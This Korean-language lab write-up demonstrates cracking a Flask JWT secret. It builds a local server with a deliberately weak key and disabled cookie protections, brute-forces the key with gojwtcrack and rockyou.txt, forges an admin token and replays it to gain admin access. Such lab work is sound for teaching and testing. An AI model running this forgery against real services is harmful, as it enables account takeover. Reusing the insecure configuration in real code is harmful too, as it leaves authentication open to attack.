# JWT (Json Web Token)

[JWT](https://ko.wikipedia.org/wiki/JSON_%EC%9B%B9_%ED%86%A0%ED%81%B0)는 인증 및 식별하기 위한 토큰 기반 인증으로 인터넷 표준이다.

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [JWT crack](#JWT-crack)**

# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.142.128           |
| python3       | 3.8.10                    |
| flask         | 2.1.2                     |
| flask-jwt-extended    | 4.4.2             |
| go            | 1.13.8 linux/amd64        |

flask를 이용하여 JWT를 생성하기 위해 관련 패키지를 설치하자.

```sh
user@user:~$ sudo apt -y install python3-pip
user@user:~$ pip3 install flask flask-jwt-extended
```

```py
from flask import Flask, jsonify
from flask_jwt_extended import JWTManager, create_access_token, get_jwt_identity, jwt_required, set_access_cookies

app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = '1234567890'
app.config['JWT_COOKIE_SECURE'] = False
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['JWT_COOKIE_CSRF_PROTECT'] = False
jwt = JWTManager(app)

@app.route('/', methods=['GET'])
def GetJWT():
    username = 'user'
    access_token = create_access_token(identity=username)
    resp = jsonify({'user': username, 'token' : access_token})
    set_access_cookies(resp, access_token)
    return resp, 200

@app.route('/auth', methods=['GET'])
@jwt_required()
def auth():
    username = get_jwt_identity()
    return jsonify({'user': username}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
```

# **JWT crack**

flask서버로 접속하면 jwt 값을 확인할 수 있다.

    access_token : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1NzAxNjQ2OCwianRpIjoiNTM0YzYzM2MtMWI1ZC00MDdlLThhYzQtZDk5YjUyYTIwNDkyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InVzZXIiLCJuYmYiOjE2NTcwMTY0NjgsImV4cCI6MTY1NzAxNzM2OH0.EkkKCuMfwvZZItOCZ4jUcJOaQTzbSVtXpXmft9aXYcE

[jwt.io](https://jwt.io/)에서 jwt를 디코딩하면 우측에 sub라는 키의 값은 user라고 나온다.

![](images/2022-07-05-21-33-24.png)

현재 secret key를 알 수 없으므로 Invalid Signature가 나온다.

golang을 설치하고 [jwt cracker](https://github.com/x1sec/gojwtcrack)를 컴파일하자.

```sh
user@user:~$ sudo apt -y install golang-go
user@user:~$ go get -u github.com/x1sec/gojwtcrack
user@user:~$ go build -o gojwtcrack go/src/github.com/x1sec/gojwtcrack/main.go
```

dictionary attack을 위한 파일을 다운 받자.

```sh
user@user:~$ wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

jwt값을 token.txt파일로 저장하고 secret key가 딕셔너리에 포함되어 있다면, 크랙에 성공한다.

```sh
user@user:~$ go/bin/gojwtcrack -d rockyou.txt -t token.txt
1234567890      eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1NzAxNjQ2OCwianRpIjoiNTM0YzYzM2MtMWI1ZC00MDdlLThhYzQtZDk5YjUyYTIwNDkyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InVzZXIiLCJuYmYiOjE2NTcwMTY0NjgsImV4cCI6MTY1NzAxNzM2OH0.EkkKCuMfwvZZItOCZ4jUcJOaQTzbSVtXpXmft9aXYcE
```

이후, [jwt.io](https://jwt.io/)를 이용하여 sub의 값을 admin으로 바꾸고 secret key를 크랙의 결과 값을 넣어서 jwt를 만들자.

![](images/2022-07-05-21-41-38.png)

이후 cookie에 담아서 서버에 인증하면, user가 admin으로 변경됨을 확인할 수 있다.

```py
import requests

url = 'http://192.168.142.128:5001/auth'
user_token  = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1NzAxNjQ2OCwianRpIjoiNTM0YzYzM2MtMWI1ZC00MDdlLThhYzQtZDk5YjUyYTIwNDkyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InVzZXIiLCJuYmYiOjE2NTcwMTY0NjgsImV4cCI6MTY1NzAxNzM2OH0.EkkKCuMfwvZZItOCZ4jUcJOaQTzbSVtXpXmft9aXYcE'

admin_token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1NzAxNjQ2OCwianRpIjoiNTM0YzYzM2MtMWI1ZC00MDdlLThhYzQtZDk5YjUyYTIwNDkyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNjU3MDE2NDY4LCJleHAiOjE2NTcwMTczNjh9.JDFj3EvsSaz8YXfCUeiGxL4X74QdPbi-w2M4XVG04Fo'

cookie = {'access_token_cookie':admin_token}
req = requests.get(url=url, cookies=cookie)
print(req.text)
```